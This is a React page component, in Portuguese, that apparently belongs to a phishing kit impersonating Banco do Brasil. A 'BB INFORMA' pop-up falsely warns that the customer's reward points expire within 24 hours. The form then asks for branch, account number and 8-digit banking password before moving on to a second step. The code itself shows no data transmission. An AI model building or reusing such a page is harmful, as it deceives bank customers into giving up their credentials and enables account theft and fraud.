import React, { useRef } from 'react'
import {Link} from 'react-router-dom'
import Navbar from '../components/Navbar'
import './PageOne.css'

const PageOne = () => {

  const modalRef = useRef(null)

  const closeModal = () => {
    modalRef.current.style.display = 'none';
  }

  return (
    <div className='page1-frame'>
      <div className='modal' ref={modalRef}>
        <div className='sob-modal'>
          <i className="bi bi-exclamation-circle" id='exclamation-icon'></i>
          <span className='title-alert'>BB INFORMA</span>
          <span className='subtitle-alert'>Prezado (a) cliente, seus pontos vence em 24h. Troque por produtos, milhas ou descontos fatura.</span>
          <span className='resgatar-btn' onClick={() => closeModal()}>RESGATAR PRODUTOS</span>
        </div>
      </div>
      <Link className='linker' to='/step2'>
      <div className='next-btn-page2'>
        <span>CONTINUAR</span>
      </div>
      </Link>
      <Navbar />
      <div className='navegacao-frame'>
        <i className="bi bi-arrow-left" id='arrow-left'></i>
        <span className='title-of-pages'>Acessar conta</span>
      </div>
      <div className='solicitacao-1'>
        <span className='titulo-solicitacao'>Pessoa física</span>
        <span className='subtitulo-solicitacao'>Informe os dados para acessar sua conta:</span>
      </div>
      <div className='entradas-1'>
        <span id='titulo-especifico-edit'>Agência</span>
        <input type="text" />
        <span className='subtitulo-solicitacao'>Troque X por 0, se necessário</span>
        <span className='titulo-entrada' id='titulo-especifico-edit'>Conta</span>
        <input type="text" />
        <span className='subtitulo-solicitacao'>Troque X por 0, se necessário</span>
        <span className='titulo-entrada' id='titulo-especifico-edit'>Senha de 8 dígitos</span>
        <input type="text" />
      </div>
    </div>
  )
}

export default PageOne